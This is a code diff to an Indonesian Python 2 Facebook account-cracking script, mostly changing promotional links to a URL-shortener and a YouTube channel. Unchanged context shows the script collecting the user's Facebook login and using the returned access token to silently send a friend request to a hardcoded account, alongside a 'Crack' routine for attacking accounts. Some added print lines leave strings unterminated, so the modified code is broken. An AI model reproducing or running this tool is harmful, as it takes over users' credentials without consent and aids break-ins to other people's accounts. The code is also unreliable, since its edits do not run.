@@ -103,7 +103,7 @@ def loginSC():
         print 42*"\033[1;91m-"
         print"\033[1;96mJANGGAN LUPA SUBSCRIBE JUGA YOUTUBE SAYA, NAWAN XT \n"
         print 42*"\033[32;1m="
-	os.system('xdg-open https://tatawirdat.blogspot.com')
+	os.system('xdg-open https://semawur.com/0HzAcbt6MG')
         username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
 	if username =="Balai" and password =="Kami":
@@ -112,7 +112,7 @@ def loginSC():
 		login()
 	else:
 		print"\033[1;96m[!] \033[1;91mSalah!!"
-		os.system('xdg-open https://tatawirdat.blogspot.com')
+		os.system('xdg-open https://www.youtube.com/channel/UCKztewPdx7oFSNXyIfJd-7w?view_as=subscriber')
                 time.sleep(1)
                 LoginSC()
 
@@ -124,6 +124,7 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
+                print('\x1b[1;96m[!] \x1b[0;1mSabar bosku,orang sabar di sayang Bapak/Ibu ✓')
 		print 42*"\033[1;96m="
 		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
@@ -156,14 +157,14 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
+				os.system('xdg-open https://www.youtube.com/channel/UCKztewPdx7oFSNXyIfJd-7w?view_as=subscriber')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
-			os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
+			os.system('xdg-open https://www.youtube.com/channel/UCKztewPdx7oFSNXyIfJd-7w?view_as=subscriber')
 			time.sleep(1)
 			keluar()
 		else:
@@ -327,8 +328,11 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[0;1mSabar om,orang sabar di sayang janda')
-	print 42*"\033[1;96m="
+	print('\x1b[1;96m[!] \x1b[0;1mSabar bosku,orang sabar di sayang Bapak/Ibu ✓')
+	print 42*"\033[1;96m-"
+        print('\x1b[1;96m[!] \x1b[0;1mNAMA
+        print('\x1b[1;96m[!] \x1b[0;1mANDA
+        print 42*"\033[1;96m="
 	
 			
 	def main(arg):
